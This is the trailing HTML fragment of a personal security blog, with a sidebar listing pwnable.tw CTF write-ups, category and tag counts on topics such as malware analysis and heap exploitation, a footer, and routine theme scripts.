href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-10T18:30:00.000Z">2020-07-11</time></p><p class="title"><a href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/">Binary Exploitation [pwnable.tw] - Spirited Away</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-04T18:30:00.000Z">2020-07-05</time></p><p class="title"><a href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Binary-Exploitation/"><span class="level-start"><span class="level-item">Binary Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Brain-Logs/"><span class="level-start"><span class="level-item">Brain Logs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/Exploitation/"><span class="level-start"><span class="level-item">Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/IoT/"><span class="level-start"><span class="level-item">IoT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Bare-Metal/"><span class="tag">Bare-Metal</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dropper/"><span class="tag">Dropper</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap-Exploitation/"><span class="tag">Heap Exploitation</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP/"><span class="tag">ROP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WarGames/"><span class="tag">WarGames</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-tw/"><span class="tag">pwnable-tw</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag">4</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a><p class="is-size-7"><span>&copy; 2021 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="/js/column.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load",()=>{"function"==typeof $.fn.lightGallery&&$(".article").lightGallery({selector:".gallery-item"}),"function"==typeof $.fn.justifiedGallery&&($(".justified-gallery > p > .gallery-item").length&&$(".justified-gallery > p > .gallery-item").unwrap(),$(".justified-gallery").justifiedGallery())})</script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now</a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load",(function(){outdatedBrowser({bgColor:"#f25648",color:"#ffffff",lowerThan:"object-fit"})}))</script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",(function(){loadInsight({contentUrl:"/content.json"},{hint:"Type something...",untitled:"(Untitled)",posts:"Posts",pages:"Pages",categories:"Categories",tags:"Tags"})}))</script></body></html>